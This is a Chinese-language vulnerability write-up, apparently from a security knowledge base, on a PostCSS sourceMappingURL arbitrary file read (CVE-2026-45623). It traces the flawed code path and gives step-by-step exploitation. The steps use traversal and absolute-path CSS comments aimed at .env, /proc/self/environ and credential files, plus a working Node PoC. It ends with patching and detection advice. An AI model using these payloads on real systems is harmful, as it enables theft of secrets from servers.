---
id: web-nodejs-postcss-sourcemappingurl-arbitrary-file-read
title: PostCSS sourceMappingURL 注释任意文件读取与异常前缀泄露（CVE-2026-45623）
type: scenario
domain: web
path: web/nodejs
technique: postcss-sourcemappingurl-file-read
aliases:
- PostCSS 任意文件读取
- CVE-2026-45623
- sourceMappingURL 文件读取
- previous map 路径穿越
- JSON.parse 异常前缀泄露
- 文件存在性 Oracle
tags:
- nodejs
- postcss
- dependency
- source-map
- arbitrary-file-read
- path-traversal
- info-leak
- error-message
cve:
- CVE-2026-45623
affected_versions: postcss < 8.5.12（8.5.12 修复任意文件读取与异常前缀外显；8.5.18 限制 from 目录边界；8.5.23 关闭无 from 默认入口）
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:12+08:00'
  notes: 已对照原文及截图核对：Input/PreviousMap/loadAnnotation/getAnnotationURL/loadMap/loadFile/consumer 六阶段、绝对路径与 from 穿越、Node 18/20+ 异常窗口差异、8.5.11/8.5.12 实测输出均一致。未验证点：未复跑 Docker PoC；前缀窗口随 V8 版本变化。
---

## 一句话结论

PostCSS 在默认配置下会从 CSS 注释中提取 `sourceMappingURL`，只去掉注释前缀后就把其中的值当成本地文件路径，经 `path.join()` 拼接后交给 `readFileSync()`；读取到的内容又被直接送入 `JSON.parse`，非 JSON 文件会通过 V8 的 `SyntaxError` 消息泄露约 10–20 字节文件前缀，同时 `existsSync` 的返回值构成文件存在性 Oracle。攻击者只需让不可信 CSS 进入 `postcss().process(css)`，即可读取进程可读的任意文件并回显其前缀。

## 原理

- 触发链在 PostCSS 内部自动完成，不需要安装任何插件：
  ```text
  Processor.process()
    → NoWorkResult
    → MapGenerator.isMap()
    → MapGenerator.previous()
    → new Input()
    → new PreviousMap()
    → loadAnnotation()
    → loadMap()
    → readFileSync()
  ```
  `Input` 构造时若 `pathAvailable && sourceMapAvailable`（Node 环境默认）就创建 `PreviousMap`，并在构造后立即调用 `map.consumer().file`，文件系统操作在 CSS 变换开始前已经发生。
- 注释提取 `loadAnnotation()` 用正则匹配 `/*# sourceMappingURL=`，并用 `lastIndexOf` 取**最后一个**匹配。这意味着攻击者只需把恶意注释追加到 CSS 尾部，就能覆盖前面合法的 source map 注释，不需要删除原有内容。
- 净化 `getAnnotationURL()` 只做：
  ```js
  sourceMapString.replace(/^\/\*\s*# sourceMappingURL=/, '').trim()
  ```
  不限制绝对路径、不检测 `../`、不做路径规范化、不区分 URL 与本地文件路径。函数名暗示产出 URL，下游却当成本地路径。
- 路径构造 `loadMap()`：
  ```js
  let map = this.annotation
  if (file) map = join(dirname(file), map)
  return this.loadFile(map)
  ```
  `path.join()` 会解析 `..` 但不限制结果必须位于某目录内。于是形成两条路径：
  - 路径 A（未设置 `opts.from`）：绝对路径原样进入 `loadFile`；
  - 路径 B（设置了 `opts.from`）：`join(dirname(from), '../../..')` 可逃逸出预期目录。
- 文件读取 `loadFile()`：
  ```js
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()
  }
  ```
  无扩展名检查、无白名单、无 trusted 标记。`existsSync` 的三种结果（不存在 → 静默返回；存在但非 JSON → 异常；存在且合法 JSON → 静默成功）构成可区分的文件系统探测 Oracle。
- 信息外显 `consumer()` 把 `this.text` 直接交给 `new SourceMapConsumer(this.text)`，最终进入 `source-map-js` 的 `JSON.parse(str.replace(/^\)]}'[^\n]*\n/, ''))`。非 JSON 内容触发 `SyntaxError`，V8 在错误消息中附带文件开头的一小段上下文：
  ```text
  SyntaxError: Unexpected token 'A', "API_KEY=sk"... is not valid JSON
  ```
- 前缀窗口不是固定常量：Node 18 只给 `in JSON at position N`（几乎没有上下文），Node 20+ 在首字符非法时给约 10–20 字符上下文；若文件开头是合法 JSON 片段再失败，则只给 position。因此它更像“前缀探针”，而不是全文下载器。
- 关键边界：漏洞在 `readFileSync()` 成功返回时已经成立（文件内容进入进程内存、`mapFile` 指向目标路径）；异常只是外显通道。8.5.12 之后的补丁切断了非 `.map`/非 JSON 的异常外显，但残余 `.map` 读取是另一条链。

## 触发条件

- 应用把攻击者可控的 CSS 传给 `postcss().process(css, opts)`。
- 运行在 Node.js 环境（`pathAvailable`/`sourceMapAvailable` 为真）。
- `opts.map` 不为 `false`（默认未显式关闭 source map）。
- 目标文件对 Node 进程可读。
- 无需安装插件、无需显式开启 source map、通常无需设置 `from`。

## 利用步骤

1. 确认目标存在“用户可控 CSS → PostCSS”的入口：主题/样式定制、在线 CSS 格式化/压缩/转换、userstyle 处理、构建服务等。
2. 判断是否设置了 `opts.from` 与 `opts.map`：默认未禁用 map 即可能触发。
3. 未设置 `from` 时，在 CSS 尾部追加绝对路径注释：
   ```css
   a {}
   /*# sourceMappingURL=/app/.env */
   ```
4. 已设置 `from` 时，构造相对穿越路径，深度按已知 `from` 目录计算：
   ```css
   a {}
   /*# sourceMappingURL=../../../../../proc/self/environ */
   ```
5. 观察响应/日志中的 `SyntaxError`：前缀出现即证明文件存在且被读取；用不存在路径对照，输出正常 CSS 说明是 Oracle 的“不存在”分支。
6. 优先选择前缀高信噪比的目标：`.env`、`/proc/self/environ`、`/etc/passwd`、部署目录下的 `.npmrc`/`.yarnrc`、云凭据配置等。
7. 若目标只吞异常不返回错误消息，仍可通过“存在但非 JSON → 报错/失败”“存在且合法 JSON → 正常”“不存在 → 正常”的差异做盲探测。

## PoC

最小库级 PoC（Node）：

```javascript
const postcss = require('postcss')

function run(name, css, opts) {
  try {
    const result = postcss().process(css, opts)
    console.log(`${name}=OK:${JSON.stringify(result.css)}`)
  } catch (e) {
    console.log(`${name}=ERR:${e.message}`)
  }
}

// 绝对路径读取（未设置 from）
run('ABSOLUTE', 'a{}\n/*# sourceMappingURL=/tmp/server-secret.env */')

// 目录穿越读取（设置了 from）
run(
  'TRAVERSAL',
  'a{}\n/*# sourceMappingURL=../../../../../tmp/server-secret.env */',
  { from: '/var/www/html/styles/main.css', map: { inline: false } }
)

// 文件不存在：正常输出，构成 Oracle 的否定分支
run('MISSING', 'a{}\n/*# sourceMappingURL=/no/such/file */')
```

目标文件 `/tmp/server-secret.env` 内容为 `API_KEY=sk-secret-12345` 时，8.5.11 实测：

```text
ABSOLUTE=ERR:Unexpected token 'A', "API_KEY=sk"... is not valid JSON
TRAVERSAL=ERR:Unexpected token 'A', "API_KEY=sk"... is not valid JSON
MISSING=OK:"a{}"
```

8.5.12 实测 `ABSOLUTE=OK`、`MISSING=OK`，非 `.map` 读取与异常外显被切断。

## 变体与关联

- 变体：`from` 已设置时，`from` 成为可计算的锚点，`..` 逃逸深度可离线推算，比无 `from` 时“赌绝对路径”更稳定。
- 变体：`lastIndexOf` 取最后一个注释，使攻击者可通过尾部追加覆盖正常 source map 注释；对“平台样式 + 用户样式字符串拼接”的系统尤其有效。
- 变体：`data:` 内联分支在 8.5.12+ 仍可能以 `SyntaxError` 外显服务端拼出的内联数据前缀（取决于谁控制内联数据）。
- 变体：8.5.12–8.5.22 的残余 `.map` 读取与 `sourcesContent` 源码泄露见 [[web-nodejs-postcss-previous-sourcemap-ingestion]]。
- 关联：[[web-java-framework-struts2-actionproxy-ognl-injection]] 等“用户可控元数据被自动解释成危险操作”的解析器问题，思路相通。
- 边界：错误消息中的前缀长度随 Node/V8 版本变化，不能把 ~10 字节当作硬编码；Node 18 与 Node 20+ 的输出形态不同。

## 检测与防御

- 修复：升级 postcss 到 `>= 8.5.23`（8.5.12 先修任意文件与异常外显，8.5.18 补 `from` 目录边界，8.5.23 关闭无 `from` 默认入口）。
- 加固：不需要 previous source map 时显式设置 `map: false`；不要把不可信 CSS 直接交给 PostCSS，或在入口对 `sourceMappingURL` 做白名单/剥离。
- 加固：若必须使用外部 source map，限制只允许读取 `opts.from` 目录内的 `.map`，并校验内容为合法 JSON；避免设置 `unsafeMap: true`。
- 检测：应用日志/响应中出现 `SyntaxError ... is not valid JSON`、`Unsupported source map encoding`、`InvalidPersistentPropertyPath` 类解析错误；同一来源提交的 CSS 尾部出现绝对路径或 `../` 的 `sourceMappingURL`；文件读取异常与外部 CSS 上传时间相关。
- 运行时：限制 Node 进程文件读权限，敏感凭据不要放在进程可读的 `.env`/`.npmrc` 中；对异常消息做脱敏，避免把解析错误原文返回给用户。
- 审计：搜索 `postcss().process(` 的调用点，确认 CSS 来源是否可信、`map`/`from` 配置是否安全；对 `unsafeMap` 做静态排查。
